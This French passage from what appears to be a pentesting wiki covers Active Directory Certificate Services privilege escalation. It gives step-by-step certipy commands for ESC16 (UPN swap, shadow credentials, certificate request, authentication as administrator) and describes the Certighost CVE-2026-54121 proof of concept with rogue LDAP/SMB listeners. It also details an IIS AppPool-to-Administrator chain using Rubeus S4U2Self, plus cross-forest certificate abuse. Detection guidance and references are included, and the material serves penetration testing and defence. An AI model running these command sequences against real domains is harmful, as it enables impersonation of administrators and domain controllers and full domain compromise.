L’exemple historique Kerberos basé uniquement sur l’UPN ci-dessous s’appuie sur la [documentation ESC16 de Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Il nécessite un KDC qui accepte encore le mappage faible ainsi obtenu ; `StrongCertificateBindingEnforcement=1` n’est plus une option de contournement prise en charge depuis la mise à jour de sécurité Windows du 9 septembre 2025.<sup>[[14]](#references)</sup>

Pour déterminer si l’environnement Active Directory Certificate Services (AD CS) est vulnérable à **ESC16**

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Étape 1 : Lire le UPN initial du compte de la victime (facultatif - pour restauration).**  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Étape 2 : Mettez à jour l’UPN du compte de la victime pour qu’il corresponde au `sAMAccountName` de l’administrateur cible.  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Étape 3 : (Si nécessaire) Obtenir les identifiants du compte « victime » (par exemple, via Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Étape 4 : Demandez un certificat en tant qu’utilisateur « victime » à partir d’un modèle d’authentification client auquel le compte peut s’inscrire (p. ex., « User ») sur l’autorité de certification configurée avec ESC16.** L’autorité de certification omet l’extension de sécurité SID du certificat émis, mais cela ne suffit pas à établir un mappage d’authentification exploitable. Définissez la variable d’environnement du cache d’identifiants Kerberos (commande shell) :

```bash
export KRB5CCNAME=victim.ccache
```

Demandez ensuite le certificat :

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Étape 5 : Rétablir l’UPN du compte « victime ».**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Étape 6 : Sur un KDC ancien ou en mode de compatibilité qui accepte ce mappage faible, authentifiez-vous en tant qu’administrateur cible.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Explication

**Certighost** exploite un **chemin de chase / callback d'inscription AD CS** où l'autorité de certification (CA) fait confiance aux attributs de requête fournis par le demandeur pour déterminer l'identité à inscrire dans le certificat émis. Dans la PoC publique, la requête spécialement conçue inclut :<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`** : hôte/IP contrôlé par l'attaquant, que la CA contactera
- **`rmd`** : **nom DNS du Domain Controller cible** à usurper

Si la CA suit ce chase, elle se connectera à l'attaquant via **SMB/LSA (`445`)** et **LDAP (`389`)**. L'attaquant utilise un **compte machine réel** (généralement créé grâce au **`ms-DS-MachineAccountQuota`** par défaut), afin que la session de callback s'authentifie en tant que principal de domaine valide. Les services rogue renvoient toutefois les attributs d'identité du **DC cible** :

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Si la CA **ne lie pas cryptographiquement l'identité renvoyée au principal de callback authentifié**, elle peut émettre un certificat pour le **Domain Controller**, alors que la session s'est authentifiée avec le compte machine contrôlé par l'attaquant. Le bug diffère donc conceptuellement de **Certifried** : au lieu de réécrire des attributs AD tels que `dNSHostName`, l'attaquant **substitue les données d'identité lors de la résolution du callback de la CA**.<sup>[[2]](#references)</sup>

**Préconditions utiles :**

- **Identifiants de domaine** avec peu de privilèges
- Possibilité de **créer ou réutiliser un compte ordinateur**
- Connectivité réseau entre la **CA** et les **ports `389` et `445`** contrôlés par l'attaquant
- Chemin de requête CA vulnérable / non corrigé (la mise à jour Microsoft du **14 juillet 2026** a ajouté la **validation DC pour `cdc`** et une **comparaison des SID résolus**)

Le **`.pfx`** obtenu peut ensuite servir pour **PKINIT**, qui produit un **`.ccache`** et, dans le flux de la PoC publiée, le **hash NT du DC cible** — ce qui suffit généralement à compromettre **l'ensemble du domaine**.

### Exploitation

La PoC publique automatise toute la chaîne :<sup>[[1]](#references)</sup>

1. Créer ou réutiliser un **compte machine** contrôlé par l'attaquant.
2. Lancer des listeners **LDAP et SMB/LSA rogue** sur les ports `389` et `445`.
3. Soumettre une requête de certificat contenant un **`cdc`** contrôlé par l'attaquant et un attribut **`rmd`** ciblant la victime.
4. Laisser la CA s'authentifier auprès des listeners rogue avec le compte machine contrôlé, puis répondre aux recherches d'identité avec les attributs du **DC cible**.
5. Recevoir un **certificat DC** signé par la CA, puis l'utiliser pour **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Indicateurs d’exécution utiles du PoC :

- `--listener <ip>` : choisir explicitement l’IP de callback annoncée dans `cdc`
- `--computer-name <NAME$>` : réutiliser un compte machine existant au lieu d’en créer un nouveau

**Notes opérationnelles :**

- Le PoC nécessite les **droits root**, car il se lie aux **ports privilégiés** `389` et `445`.
- Une exploitation réussie écrit localement un **`.pfx` de DC** et un **`.ccache` Kerberos**.
- Comme le certificat est associé à un compte de contrôleur de domaine, les actions ultérieures peuvent inclure l’**auth Kerberos par certificat**, **DCSync** et la réutilisation du **hash NT de la machine** récupéré.<sup>[[2]](#references)</sup>

## De l’inscription de la machine IIS AppPool à Administrator sur le même hôte

Un pool IIS exécuté sous `ApplicationPoolIdentity` utilise le **compte ordinateur** de son hôte pour accéder aux ressources réseau. Par conséquent, une exécution de code en tant que `IIS AppPool\<POOL>` reste peu privilégiée dans le jeton local, mais peut soumettre une requête AD CS que l’AC authentifie en tant que `HOST$` ; il s’agit d’une transition d’identité sortante, et non d’une usurpation de jeton ni d’une élévation locale de type Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Cette chaîne nécessite un hôte IIS joint au domaine, une AC Enterprise accessible via RPC, un modèle machine publié pour lequel l’ordinateur dispose des droits d’inscription, la prise en charge de PKINIT et un accès au KDC/SMB. Une identité de pool personnalisée modifie le principal sortant ; confirmez donc que le pool utilise bien `ApplicationPoolIdentity` avant de supposer qu’il s’agit de `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Inscription avec une clé contrôlée par l’attaquant

Générez la paire de clés et la CSR en dehors du serveur IIS, puis conservez la clé privée. Depuis le worker compromis, soumettez **uniquement la CSR**. Le [PoC ASPX Certi-Bhai](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) instancie `CertificateAuthority.Request`, définit `CertificateTemplate:Machine`, appelle `ICertRequest::Submit` et renvoie le certificat émis. Utilisez la chaîne de configuration de l’AC `CAHOST\CA-NAME` ; un modèle `Machine` standard construit le sujet à partir d’AD, les données de sujet/SAN fournies par le demandeur ne sont donc pas nécessaires.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Associez le certificat renvoyé à la **clé correspondante conservée**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` ne fonctionne que si Windows peut déjà associer le certificat à une clé privée accessible ; pour des fichiers PEM distincts, créez explicitement un PKCS#12 :<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Utilisez le PFX pour PKINIT et conservez le TGT de l’ordinateur obtenu au format base64 au lieu de l’injecter immédiatement :<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self plus substitution de service sur le même hôte

S4U2Self permet à un service d’obtenir un ticket **pour lui-même** contenant les données d’autorisation d’un autre utilisateur. Avec le TGT de l’ordinateur, Rubeus peut demander ce ticket pour un utilisateur privilégié, remplacer le nom du service dans le KRB-CRED retourné par CIFS, puis l’injecter. Il s’agit de la primitive locale « delegate to thyself » : elle ne nécessite ni S4U2Proxy ni entrée `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Le ticket substitué ne peut être utilisé que par des services associés au **même compte/à la même clé d’ordinateur** (ici, CIFS sur `HOST`). Il ne s’agit pas d’un ticket Administrator réutilisable sur d’autres machines du domaine. De plus, le résultat démontré est un accès SMB/au système de fichiers avec des privilèges Administrator ; l’obtention d’un processus local `NT AUTHORITY\SYSTEM` nécessite encore une étape distincte d’exécution à distance.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Détection et renforcement de la sécurité

- Sur l’AC, corrélez les événements Certification Services **4886** (demande reçue) et **4887** (certificat émis) pour repérer les demandes inattendues utilisant le modèle `Machine` et provenant de comptes de serveurs IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- Sur les DC, l’événement **4768** inclut des champs de certificat lorsque la pré-authentification par certificat est utilisée ; déclenchez une alerte pour les demandes PKINIT de TGT inhabituelles provenant de comptes de serveurs web. Recherchez ensuite les demandes **4769** impliquant une identité privilégiée usurpée et le même hôte. Comme Rubeus modifie côté client le nom du service KRB-CRED avec `/altservice`, n’exigez pas que le nom du service indiqué côté DC dans l’événement 4769 soit `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Recherchez les connexions de `w3wp.exe` aux points de terminaison RPC de l’AC, la création inattendue de fichiers ASPX, les accès aux partages administratifs authentifiés par Kerberos et les activités de dump de secrets. Dans la mesure du possible, limitez l’accès de la couche applicative aux services RPC de l’AC, au KDC et à SMB ; supprimez les droits d’inscription des ordinateurs ou les modèles d’authentification des machines qui ne sont pas nécessaires au fonctionnement.<sup>[[19]](#references)</sup>

## Compromission de forêts avec des certificats expliquée à la voix passive

### Rupture des relations d’approbation entre forêts par des AC compromises

La configuration de l’**inscription inter-forêts** est relativement simple. Le **certificat de l’AC racine** de la forêt de ressources est **publié dans les forêts de comptes** par les administrateurs, et les certificats des **AC d’entreprise** de la forêt de ressources sont **ajoutés aux conteneurs `NTAuthCertificates` et AIA de chaque forêt de comptes**. Pour clarifier, cette configuration accorde à l’**AC de la forêt de ressources un contrôle total** sur toutes les autres forêts pour lesquelles elle gère la PKI. Si cette AC est **compromise par des attaquants**, des certificats pour tous les utilisateurs des forêts de ressources et de comptes pourraient être **forgés par ces derniers**, ce qui briserait la frontière de sécurité de la forêt.<sup>[[6]](#references)</sup>

### Droits d’inscription accordés à des principaux étrangers

Dans les environnements à plusieurs forêts, il faut faire preuve de prudence avec les AC d’entreprise qui **publient des modèles de certificats** autorisant les **utilisateurs authentifiés ou les principaux étrangers** (utilisateurs/groupes externes à la forêt à laquelle appartient l’AC d’entreprise) à **s’inscrire et à modifier les modèles**.\
Lors d’une authentification à travers une relation d’approbation, AD ajoute le **SID Authenticated Users** au jeton de l’utilisateur. Ainsi, si un domaine possède une AC d’entreprise avec un modèle qui **accorde des droits d’inscription aux utilisateurs authentifiés**, un utilisateur d’une autre forêt pourrait potentiellement **s’inscrire à ce modèle**. De même, si un modèle **accorde explicitement des droits d’inscription à un principal étranger**, une **relation de contrôle d’accès inter-forêts est ainsi créée**, permettant à un principal d’une forêt de **s’inscrire à un modèle d’une autre forêt**.

Ces deux scénarios **élargissent la surface d’attaque** d’une forêt à une autre. Les paramètres du modèle de certificat pourraient être exploités par un attaquant pour obtenir des privilèges supplémentaires dans un domaine étranger.<sup>[[6]](#references)</sup>


## References

- [1] [Dépôt PoC de aniqfakhrul/CVE-2026-54121](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Analyse technique de Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blog SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned : abus des Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0 : ESC9, ESC10, interface graphique BloodHound, nouvelles méthodes d’authentification et de demande, et plus encore](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials : abus du mappage de comptes Key Trust pour prendre le contrôle d’un compte](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – L’histoire de l’utilisation (abusive) des Enhanced Key](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relais vers les Active Directory Certificate Services via RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12 : accès shell à l’AC ADCS avec YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Technique d’abus ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Technique d’abus ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Wiki Certipy – Élévation de privilèges (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu : pas une simple autre faille AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16 : mauvaise configuration et exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Réexamen de « Delegate 2 Thyself »](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – PoC d’inscription IIS AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Élévation de privilèges depuis IIS AppPool via le point de terminaison RPC AD CS](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Identités des pools d’applications](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Spécifications ouvertes Microsoft – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – commande pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Auditer Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Événement 4768 : un ticket d’authentification Kerberos a été demandé](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Événement 4769 : un ticket de service Kerberos a été demandé](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – Boîte à outils d’exploitation AD CS PowerShell](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
